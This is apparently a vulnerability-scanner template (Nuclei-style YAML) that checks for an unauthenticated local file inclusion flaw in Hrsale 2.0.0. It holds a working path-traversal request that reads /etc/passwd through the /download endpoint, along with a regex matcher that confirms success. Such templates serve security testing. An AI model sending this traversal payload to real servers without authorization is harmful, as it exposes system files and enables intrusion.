id: hrsale-unauthenticated-lfi
name: Hrsale 2.0.0 - Local File Inclusion
severity: high
confidence: tentative
description: Hrsale 2.0.0 is vulnerable to local file inclusion. This exploit allow you to download any readable file from
  server without permission and login session
reference: CWE-22
tags:
- hrsale
- lfi
- edb
- vuln
requests:
- method: GET
  path: /download?type=files&filename=../../../../../../../../etc/passwd
  matchers:
  - type: regex
    regex:
    - root:[x*]:0:0
  - type: status
    status:
    - 200
  condition: and
